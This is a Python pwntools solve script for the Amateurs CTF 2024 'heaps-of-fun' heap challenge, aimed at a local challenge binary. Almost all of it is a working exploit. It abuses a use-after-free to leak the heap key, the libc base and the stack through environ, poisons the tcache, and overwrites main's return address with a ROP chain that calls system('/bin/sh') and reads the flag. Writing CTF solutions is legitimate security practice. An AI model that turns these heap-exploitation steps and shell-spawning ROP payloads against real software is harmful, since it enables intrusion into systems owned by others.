#!/usr/bin/env python3
"""Amateurs CTF 2024 - heaps-of-fun solve script
Vulnerability: UAF allows read/edit freed chunks
Technique: UAF leak heap key -> unsorted bin leak libc -> environ leak stack -> ROP
"""
from pwn import *

context.arch = 'amd64'
exe = context.binary = ELF("./binary", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2")

def start():
    return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def create(idx, key_sz, key_data, val_sz, val_data):
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"key size: ", str(key_sz).encode())
    io.sendafter(b"key: ", key_data)
    io.sendlineafter(b"val size: ", str(val_sz).encode())
    io.sendafter(b"val: ", val_data)

def delete(idx):
    io.sendlineafter(b">>> ", b"4")
    io.sendlineafter(b"idx: ", str(idx).encode())

def update(idx, data):
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendafter(b"new: ", data)

def view(idx):
    io.sendlineafter(b">>> ", b"3")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.recvuntil(b"key = ")
    key = io.recvline(keepends=False)
    io.recvuntil(b"val = ")
    val = io.recvline(keepends=False)
    return key, val

io = start()

# Heap leak && Heap key
create(0, 0x10, b"A"*0x10, 0x10, b"B"*0x10)
delete(0)
key, val = view(0)
heap_key = u64(key[:8])
heap_base = heap_key << 12
log.success(f"Heap key @ {hex(heap_key)}")
log.success(f"Heap base @ {hex(heap_base)}")

# Libc leak
create(1, 0x500, b"A", 0x500, b"BB")
delete(1)
key, _ = view(1)
libc_leak = u64(key[:8])
libc.address = libc_leak - 0x21ace0
log.success(f"Libc base @ {hex(libc.address)}")

create(0, 10, b"A", 10, b"BB")  # Clear bins

# Tcache poisoning to get stack leak from libc's environ
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\x00")))
payload = b"A"*8 + rop.chain()
sz = len(payload)

create(10, sz, b"A", sz, b"B")
create(11, sz, b"A", sz, b"B")

create(0, sz, b"A", sz, b"BB")
create(1, sz, b"A", sz, b"BB")
delete(0)
delete(1)
update(0, p64(libc.sym.environ ^ heap_key))
create(2, sz, b"A", sz, b"BB")
create(3, sz, b"A", sz, b"")
_, val = view(3)
environ = u64(val[:8]) + 0xe8
retaddr_main = environ - 0x120 - 0x80 - 8
log.success(f"Environ @ {hex(environ)}")
log.success(f"Retaddr main @ {hex(retaddr_main+8)}")

# Tcache poisoning to write ROP chain to return address of main
delete(10)
delete(11)
update(10, p64(retaddr_main ^ heap_key))
create(12, sz, b"A", sz, b"BB")
create(13, sz, b"A", sz, payload)

io.sendlineafter(b">>> ", b"5")
io.clean(timeout=1)
io.sendline(b"cat flag.txt")
io.clean(timeout=1)
io.interactive()
